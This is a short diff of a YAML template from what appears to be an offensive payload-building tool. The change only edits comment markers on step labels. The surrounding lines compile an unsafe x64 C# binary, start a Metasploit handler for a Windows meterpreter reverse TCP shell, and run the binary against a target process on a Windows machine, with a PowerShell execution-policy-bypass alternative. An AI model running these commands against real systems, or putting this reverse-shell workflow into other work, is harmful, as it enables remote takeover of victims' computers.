@@ -120,11 +120,11 @@ output:
     command: "mcs -out:{{ output_path }}/{{ output_file }} -platform:x64 -unsafe {{ source_file }}"
 
   launch_instructions: |
-    # Step 1: Start Metasploit listener
+    Step 1: Start Metasploit listener
     msfconsole -q -x "use exploit/multi/handler; set payload windows/x64/meterpreter_reverse_tcp; set LHOST {{ lhost }}; set LPORT {{ lport }}; set EXITFUNC thread; exploit"
 
-    # Step 2: Execute on target Windows system
+    Step 2: Execute on target Windows system
     {{ output_file }} {{ target_process }}
 
-    # Alternative: Execute with PowerShell
+    Alternative: Execute with PowerShell
     powershell -ExecutionPolicy Bypass -File {{ output_file }} {{ target_process }}
